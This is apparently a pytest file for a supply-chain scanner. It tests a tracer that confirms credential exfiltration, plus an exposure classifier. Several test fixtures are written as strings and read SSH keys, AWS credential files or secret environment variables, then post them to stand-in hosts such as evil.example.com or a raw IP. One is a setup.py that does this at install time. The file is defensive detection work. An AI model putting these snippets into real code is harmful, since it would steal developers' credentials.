"""Tests for the credential-exfiltration data-flow tracer and exposure classifier.

The existing composite signal (``EXFIL_CREDENTIALS_TO_NETWORK``, tested in
``test_analysis.py``) fires on co-occurrence: a sensitive path read anywhere in
a file, and a network call anywhere in the same file. The tests here exist to
prove the specific thing that heuristic cannot: that ``CONFIRMED_CREDENTIAL_
EXFILTRATION`` only fires when the *value itself* is traced from the read to
the send, and — the case that actually matters — does *not* fire when the two
behaviours are unrelated coincidences in the same file.
"""

from __future__ import annotations

from pathlib import Path

import pytest
from chainguard.analysis.dataflow import ConfirmedFlow
from chainguard.analysis.engine import analyse_source_text
from chainguard.analysis.exposure import ExposureVerdict, classify_exposure
from chainguard.analysis.python_ast import analyse_python_file
from chainguard.models.package import Ecosystem
from chainguard.vulns.reachability import ReachabilityAnalyser


def codes(analysis) -> set[str]:
    return {s.code for s in analysis.signals}


CONFIRMED = "CONFIRMED_CREDENTIAL_EXFILTRATION"


class TestConfirmedFlowDetection:
    def test_direct_read_and_send_is_confirmed(self):
        """The motivating example: open().read() flowing straight into a send."""
        result = analyse_python_file(
            "steal.py",
            """
import urllib.request

def steal():
    with open("/home/user/.ssh/id_rsa") as f:
        key = f.read()
    urllib.request.urlopen("http://45.9.148.99/collect", data=key.encode())
""",
        )
        assert CONFIRMED in codes(result)
        assert len(result.confirmed_flows) == 1
        flow = result.confirmed_flows[0]
        assert flow.function_scope == "steal"
        assert flow.source_kind == "credential_file"
        assert flow.sink_target == "urllib.request.urlopen"

    def test_unrelated_read_and_send_is_not_confirmed(self):
        """The case the old co-occurrence heuristic gets wrong.

        Reads a credential path in one function and makes an unrelated network
        call in another, in the same file. Going through the full package
        pipeline (not just the per-file analyser) so the *existing* composite
        signal — EXFIL_CREDENTIALS_TO_NETWORK, computed in engine.py from
        file-level co-occurrence — is also exercised: it still fires, unchanged,
        because this feature is additive. CONFIRMED_CREDENTIAL_EXFILTRATION
        must not, because nothing about the network call depends on what was
        read. That contrast is the entire point of this feature.
        """
        source = """
import requests

def check_ssh_config():
    with open("/home/user/.ssh/id_rsa") as f:
        exists = True
    return exists

def ping_home():
    requests.get("https://example.com/healthcheck")
"""
        result = analyse_source_text(
            "innocent-pkg", "1.0.0", Ecosystem.PYPI, {"innocent.py": source}
        )
        signal_codes = {s.code for s in result.signals}
        assert "EXFIL_CREDENTIALS_TO_NETWORK" in signal_codes
        assert CONFIRMED not in signal_codes
        assert result.confirmed_flows == []

        # And directly at the file-analyser level, no flow was traced either.
        file_result = analyse_python_file("innocent.py", source)
        assert CONFIRMED not in codes(file_result)
        assert file_result.confirmed_flows == []

    def test_multi_hop_variable_chain_is_traced(self):
        """secret -> intermediate variable -> dict -> sink, across three lines."""
        result = analyse_python_file(
            "chain.py",
            """
import requests

def leak():
    f = open("/home/user/.aws/credentials")
    raw = f.read()
    payload = {"data": raw}
    requests.post("http://evil.example.com", json=payload)
""",
        )
        assert CONFIRMED in codes(result)
        assert result.confirmed_flows[0].source_kind == "credential_file"

    def test_secret_environment_variable_is_a_source(self):
        result = analyse_python_file(
            "env.py",
            """
import os
import requests

def leak_env():
    token = os.getenv("AWS_SECRET_ACCESS_KEY")
    requests.post("http://evil.example.com", data=token)
""",
        )
        assert CONFIRMED in codes(result)
        assert result.confirmed_flows[0].source_kind == "credential_env"

    def test_ordinary_environment_variable_is_not_a_source(self):
        """PATH, LANG etc. are not secrets — the point of the name filter."""
        result = analyse_python_file(
            "config.py",
            """
import os
import requests

def report_health():
    lang = os.getenv("LANG")
    requests.post("http://example.com/telemetry", data=lang)
""",
        )
        assert CONFIRMED not in codes(result)

    def test_module_level_flow_is_its_own_scope(self):
        """Flows at module level are tagged '<module>', not inside a function —
        exposure classification treats this as import-time exposure."""
        result = analyse_python_file(
            "moduleflow.py",
            """
import requests
with open("/home/user/.ssh/id_rsa") as f:
    key = f.read()
requests.post("http://evil.example.com", data=key)
""",
        )
        assert CONFIRMED in codes(result)
        assert result.confirmed_flows[0].function_scope == "<module>"

    def test_setup_py_flow_is_marked_runs_at_install(self):
        result = analyse_python_file(
            "setup.py",
            """
import requests
from setuptools import setup

with open("/home/user/.aws/credentials") as f:
    data = f.read()
requests.post("http://evil.example.com", data=data)

setup(name="innocuous-package")
""",
        )
        assert CONFIRMED in codes(result)
        assert result.confirmed_flows[0].runs_at_install is True

    def test_comments_and_docstrings_do_not_trigger_it(self):
        """Same discipline as the existing analyser: parse, don't pattern-match."""
        result = analyse_python_file(
            "doc.py",
            '''
"""This module reads ~/.ssh/id_rsa in its docstring but does nothing."""
# requests.post("http://evil.example.com", data=open("~/.ssh/id_rsa").read())
def safe():
    return "no real behaviour here"
''',
        )
        assert CONFIRMED not in codes(result)


class TestExposureClassification:
    """The exposure classifier reuses the exact reachability engine built for
    CVEs (vulns/reachability.py) — these tests exercise it directly against a
    synthetic project, independent of the tracer above."""

    @pytest.fixture()
    def project(self, tmp_path: Path) -> Path:
        (tmp_path / "app.py").write_text(
            "import evilpkg\n\ndef main():\n    evilpkg.sync_data()\n",
            encoding="utf-8",
        )
        return tmp_path

    def _flow(self, **overrides) -> ConfirmedFlow:
        defaults = dict(
            file="evilpkg/core.py", function_scope="sync_data",
            source_line=3, source_kind="credential_file", source_evidence="x",
            sink_line=5, sink_target="requests.post", sink_evidence="x",
            runs_at_install=False,
        )
        defaults.update(overrides)
        return ConfirmedFlow(**defaults)

    def test_reachable_call_is_proven_with_a_path(self, project):
        analyser = ReachabilityAnalyser(project, Ecosystem.PYPI)
        result = classify_exposure(self._flow(), "evilpkg", analyser)
        assert result.verdict is ExposureVerdict.CALL_REACHABLE
        assert result.call_path  # a concrete path, not just an assertion

    def test_uncalled_function_is_not_reachable(self, project):
        analyser = ReachabilityAnalyser(project, Ecosystem.PYPI)
        flow = self._flow(function_scope="never_called")
        result = classify_exposure(flow, "evilpkg", analyser)
        assert result.verdict is ExposureVerdict.CALL_NOT_REACHABLE

    def test_module_level_flow_is_import_time_when_package_is_imported(self, project):
        analyser = ReachabilityAnalyser(project, Ecosystem.PYPI)
        flow = self._flow(function_scope="<module>")
        result = classify_exposure(flow, "evilpkg", analyser)
        assert result.verdict is ExposureVerdict.IMPORT_TIME

    def test_package_never_imported_is_not_reachable(self, project):
        analyser = ReachabilityAnalyser(project, Ecosystem.PYPI)
        flow = self._flow(function_scope="leak")
        result = classify_exposure(flow, "unimported_pkg", analyser)
        assert result.verdict is ExposureVerdict.CALL_NOT_REACHABLE
        assert "never imports it" in result.reason

    def test_install_time_flow_is_exposed_unconditionally(self, project):
        """Install-time exposure does not depend on the app's call graph at
        all — must resolve correctly even without a project to check against."""
        flow = self._flow(runs_at_install=True)
        result = classify_exposure(flow, "evilpkg", analyser=None)
        assert result.verdict is ExposureVerdict.INSTALL_TIME

    def test_no_project_source_is_reported_as_unknown_not_safe(self):
        """Absence of a project must never be read as 'not exposed'."""
        result = classify_exposure(self._flow(), "evilpkg", analyser=None)
        assert result.verdict is ExposureVerdict.UNKNOWN
